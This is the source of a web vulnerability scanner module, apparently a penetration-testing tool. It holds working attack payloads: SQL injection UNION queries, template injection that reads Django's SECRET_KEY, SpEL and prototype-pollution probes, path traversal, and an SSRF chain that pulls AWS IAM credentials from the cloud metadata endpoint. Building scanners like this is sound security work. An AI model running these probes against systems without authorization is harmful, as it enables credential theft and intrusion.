/// @file scanners/elite.cpp
/// @brief Elite detection: response fingerprinting, tech-adaptive payloads,
///        IDOR enumeration, error harvesting, exploit chains, scope expansion,
///        anomaly detection.
#include "scanner_base.hpp"
#include <set>

namespace apex {
namespace {

/// IDOR is implemented once, canonically, in detection_gap.cpp (with the
/// authorization-boundary gate). The duplicate copy that used to live here was
/// removed during dedup so exactly one hardened IDOR scanner runs.

/// Error harvesting — trigger errors to reveal internal info.
std::vector<Finding> scan_error_harvest(const Config &, HttpClient &http,
                                        const CrawlResult &crawl) {
  std::vector<Finding> findings;
  const std::vector<std::string> triggers = {
      "[]", "{}", "null", "undefined", "-1", "99999999",
      "' OR ''='", "../../../", "%00", "{{", "${}"};
  const std::vector<std::string> error_sigs = {
      "stack trace", "Traceback", "Exception", "at line",
      "Fatal error", "Warning:", "Debug:", "Internal Server Error",
      "NullPointerException", "TypeError"};

  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url);
    for (const auto &[base, param] : targets) {
      for (const auto &trigger : triggers) {
        auto resp = http.get(base + trigger);
        for (const auto &sig : error_sigs) {
          if (resp.body.find(sig) != std::string::npos) {
            findings.push_back({"Error Disclosure", "medium", url,
                                "Error leaked: " + sig, param, trigger, ""});
            goto next_param;
          }
        }
      }
      next_param:;
    }
  }
  return findings;
}

/// Exploit chain: SSRF → AWS credentials.
std::vector<Finding> scan_exploit_chain_ssrf(const Config &, HttpClient &http,
                                             const CrawlResult &crawl) {
  std::vector<Finding> findings;
  const std::string meta_url =
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/";

  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url, "url");
    for (const auto &[base, param] : targets) {
      auto resp = http.get(base + meta_url);
      if (resp.status_code == 200 && !resp.body.empty() &&
          resp.body.find("<") == std::string::npos) {
        // Got a role name, try to get credentials.
        std::string role = resp.body.substr(0, resp.body.find('\n'));
        auto creds = http.get(base + meta_url + role);
        if (creds.body.find("AccessKeyId") != std::string::npos) {
          findings.push_back({"Exploit Chain", "critical", url,
                              "SSRF → AWS IAM credentials via " + role,
                              param, meta_url + role, "AccessKeyId found"});
        }
      }
    }
  }
  return findings;
}

/// Scope expansion — discover related endpoints.
std::vector<Finding> scan_scope_expansion(const Config &, HttpClient &http,
                                          const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> api_paths = {
      "/api/", "/api/v1/", "/api/v2/", "/graphql", "/rest/",
      "/internal/", "/admin/api/", "/debug/", "/_debug/"};

  for (const auto &path : api_paths) {
    auto resp = http.get(base + path);
    if (resp.status_code == 200 || resp.status_code == 401 ||
        resp.status_code == 403) {
      findings.push_back({"Scope Expansion", "info", base + path,
                          "API endpoint found (HTTP " +
                              std::to_string(resp.status_code) + ")",
                          "", "", ""});
    }
  }
  return findings;
}

/// Anomaly detection — find responses that differ from baseline.
std::vector<Finding> scan_anomaly(const Config &, HttpClient &http,
                                  const CrawlResult &crawl) {
  std::vector<Finding> findings;
  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url);
    for (const auto &[base, param] : targets) {
      auto baseline = http.get(base + "normal");
      const std::vector<std::string> probes = {
          "admin", "root", "null", "true", "false", "0", "-1"};
      for (const auto &probe : probes) {
        auto resp = http.get(base + probe);
        if (resp.status_code != baseline.status_code &&
            resp.status_code != 404) {
          findings.push_back({"Anomaly", "low", url,
                              "Status anomaly: " + probe + " → HTTP " +
                                  std::to_string(resp.status_code),
                              param, probe, ""});
        }
      }
    }
  }
  return findings;
}

/// Tech-adaptive payloads — detect tech stack and use targeted payloads.
std::vector<Finding> scan_tech_adaptive(const Config &, HttpClient &http,
                                        const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);
  auto resp = http.get(base + "/");

  // Detect tech and choose payloads.
  struct TechPayload {
    const char *detect;
    const char *type;
    const char *payload;
    const char *evidence;
  };
  const TechPayload tech_payloads[] = {
      {"PHP", "SQLi", "' UNION SELECT null,version()--", "MariaDB"},
      {"ASP.NET", "SQLi", "' UNION SELECT null,@@version--", "Microsoft"},
      {"Express", "Prototype Pollution", "__proto__[test]=1", "__proto__"},
      {"Django", "SSTI", "{{settings.SECRET_KEY}}", "SECRET_KEY"},
      {"Spring", "SpEL", "${7*7}", "49"},
      {"Laravel", "SQLi", "' UNION SELECT null,database()--", "information_schema"},
  };

  for (const auto &tp : tech_payloads) {
    bool detected = resp.body.find(tp.detect) != std::string::npos;
    if (!detected) {
      for (const auto &[h, v] : resp.headers) {
        if (v.find(tp.detect) != std::string::npos) { detected = true; break; }
      }
    }
    if (!detected) continue;

    for (const auto &url : crawl.urls) {
      auto targets = get_targets(crawl, url);
      for (const auto &[tbase, param] : targets) {
        auto test = http.get(tbase + std::string(tp.payload));
        if (test.body.find(tp.evidence) != std::string::npos) {
          findings.push_back({tp.type, "high", url,
                              std::string("Tech-adaptive: ") + tp.detect,
                              param, tp.payload, tp.evidence});
        }
      }
    }
  }
  return findings;
}

} // namespace

std::vector<Scanner> register_elite_scanners() {
  return {
      // NOTE: IDOR is registered once, canonically, in detection_gap.cpp.
      // The duplicate elite copy was removed so a single hardened scanner runs.
      {"Error Harvesting", scan_error_harvest},
      {"Exploit Chain (SSRF→AWS)", scan_exploit_chain_ssrf},
      {"Scope Expansion", scan_scope_expansion},
      {"Anomaly Detection", scan_anomaly},
      {"Tech-Adaptive", scan_tech_adaptive},
  };
}

} // namespace apex
